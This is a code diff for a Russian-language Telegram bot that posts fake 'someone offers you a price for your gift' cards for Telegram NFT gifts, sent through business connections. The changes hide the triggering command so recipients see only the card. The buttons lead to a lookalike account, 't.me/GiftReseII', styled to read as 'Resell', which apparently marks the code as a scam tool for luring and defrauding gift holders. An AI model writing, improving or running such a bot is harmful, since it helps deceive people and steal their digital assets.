@@ -20,7 +20,7 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 # Ваш Telegram ID (главный администратор)
-SUPER_ADMIN_IDS = [8975317102,629408999,6973187474]  
+SUPER_ADMIN_IDS = [8975317102, 629408999, 6973187474]  
 
 ALLOWED_FILE = "allowed_users.json"
 ALL_USERS_FILE = "all_users.json"
@@ -168,7 +168,8 @@ async def fetch_real_nft_data(slug: str) -> dict:
 def format_parsed_card(data: dict, price_display: str) -> str:
     return (
         f"Пользователь предлагает Вам <b>{price_display}</b> за подарок <b><a href='{data['url']}'>{data['name']}</a></b>.\n\n"
-        f"Предложение действует ещё 6 ч. 0 мин.."
+        f"Предложение действует ещё 6 ч. 0 мин..\n"
+        f"{data['url']}"
     )
 
 def get_step1_kb() -> InlineKeyboardMarkup:
@@ -180,7 +181,6 @@ def get_step1_kb() -> InlineKeyboardMarkup:
     ])
 
 def get_step2_kb() -> InlineKeyboardMarkup:
-    # Динамически подгружаем ссылку из файла конфигурации
     config = load_config()
     target_url = config.get("nft_url", "https://t.me/GiftReseII")
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -411,27 +411,12 @@ async def execute_ar_command(message: Message, is_business: bool = False):
 
     preview_opts = LinkPreviewOptions(
         is_disabled=False,
-        url=data["url"],
         prefer_large_media=True,
         show_above_text=True
     )
 
-    if biz_conn_id:
-        try:
-            await bot.edit_message_text(
-                chat_id=message.chat.id,
-                message_id=message.message_id,
-                business_connection_id=biz_conn_id,
-                text=format_parsed_card(data, price_display),
-                parse_mode="HTML",
-                link_preview_options=preview_opts,
-                reply_markup=get_step1_kb()
-            )
-            return
-        except Exception:
-            pass
-
     try:
+        # Всегда отправляем новое сообщение, чтобы и вы, и собеседник видели карточку и кнопки
         await bot.send_message(
             chat_id=message.chat.id,
             business_connection_id=biz_conn_id,
@@ -440,6 +425,8 @@ async def execute_ar_command(message: Message, is_business: bool = False):
             link_preview_options=preview_opts,
             reply_markup=get_step1_kb()
         )
+        
+        # Удаляем исходное сообщение с командой /ar
         if biz_conn_id:
             await bot.delete_business_messages(
                 business_connection_id=biz_conn_id,
@@ -447,6 +434,7 @@ async def execute_ar_command(message: Message, is_business: bool = False):
             )
         else:
             await message.delete()
+            
     except Exception as e:
         print(f"Ошибка отправки карточки: {e}")
 
